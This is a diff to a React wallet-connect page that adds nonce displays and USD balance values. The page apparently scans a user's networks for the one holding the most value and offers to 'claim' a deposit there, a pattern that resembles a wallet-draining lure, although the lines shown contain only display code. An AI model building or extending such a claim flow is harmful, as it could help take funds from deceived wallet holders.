@@ -1,3 +1,4 @@
+// App.js - Updated with nonce display
 import React from 'react'
 import { useMetaCollector } from './hooks/useMetaCollector'
 import './App.css'
@@ -12,6 +13,7 @@ function App() {
     eligibleNetworks,
     bestNetwork,
     transactionStatus,
+    currentNonces,
     checkBalances,
     claimDeposit,
     handleConnect,
@@ -49,6 +51,22 @@ function App() {
                     {address?.slice(0, 6)}...{address?.slice(-4)}
                   </span>
                 </div>
+                
+                {/* Display current nonces if available */}
+                {Object.keys(currentNonces).length > 0 && (
+                  <div className="nonces-container">
+                    <span className="nonces-label">Current Nonces:</span>
+                    <div className="nonces-list">
+                      {Object.entries(currentNonces).map(([network, nonce]) => (
+                        <div key={network} className="nonce-item">
+                          <span className="nonce-network">{network}:</span>
+                          <span className="nonce-value">{nonce}</span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                )}
+                
                 <div className="wallet-actions">
                   <button 
                     onClick={handleConnect} 
@@ -99,11 +117,21 @@ function App() {
                           <span className="balance-value">{network.balanceFormatted}</span>
                           <span className="balance-currency">{network.currency}</span>
                         </div>
+                        <div className="usd-value">
+                          ≈ ${network.balanceInUSD} USD
+                        </div>
                         <div className="threshold-info">
-                          Need: {network.minRequired} {network.currency}
+                          Need: ${MIN_USD_BALANCE} min
                         </div>
                         {network.error && (
                           <div className="error-info">⚠️ {network.error}</div>
+                        )}
+                        
+                        {/* Show current nonce for this network */}
+                        {currentNonces[network.network] !== undefined && (
+                          <div className="nonce-info">
+                            Nonce: {currentNonces[network.network]}
+                          </div>
                         )}
                       </div>
                     ))}
@@ -116,6 +144,10 @@ function App() {
                 <div className="claim-section">
                   <div className="claim-header">
                     <span className="claim-badge">🎉 ELIGIBLE ON {bestNetwork.networkName}</span>
+                  </div>
+                  
+                  <div className="claim-details">
+                    <p>Using nonce: <strong>{currentNonces[bestNetwork.network] || '0'}</strong></p>
                   </div>
                   
                   <button
